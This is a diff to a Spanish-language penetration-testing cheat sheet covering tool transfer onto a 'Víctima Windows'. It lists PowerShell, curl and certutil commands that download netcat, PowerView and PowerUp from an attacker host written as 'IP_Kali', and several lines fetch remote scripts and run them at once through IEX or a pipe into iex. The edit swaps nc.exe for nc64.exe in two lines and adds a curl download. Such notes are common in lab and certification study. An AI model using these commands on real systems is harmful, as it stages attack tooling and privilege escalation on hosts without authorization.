@@ -73,12 +73,13 @@ EXTRA:
 ### Víctima Windows — Descargar (Subir) a Windows 
 
 ```bash
-1  ❯ powershell -c "Invoke-WebRequest http://IP_Kali/nc.exe -OutFile nc.exe"
+1  ❯ powershell -c "Invoke-WebRequest http://IP_Kali/nc64.exe -OutFile nc64.exe"
    ❯ powershell -c "IWR http://IP_Kali/nc.exe -OutFile nc.exe"
-   ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/nc.exe','nc.exe')"
+   ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/nc64.exe','nc64.exe')"
    # PowerShell → varias alternativas si una falla
    ❯ IEX (New-Object Net.WebClient).DownloadString('http://IP_Kali/PowerView.ps1')
    ❯ wget -useb IP_Kali/PowerUP.ps1|iex;Invoke-AllChecks 
+   ❯ curl http://IP_Kali/nc64.exe -o C:\Temp\nc64.exe
 
 2  ❯ certutil -urlcache -f http://IP_Kali/nc.exe C:\Users\Public\nc.exe
    ❯ certutil.exe -f -urlcache -split http://IP_Kali/nc64.exe C:\Temp\nc64.exe
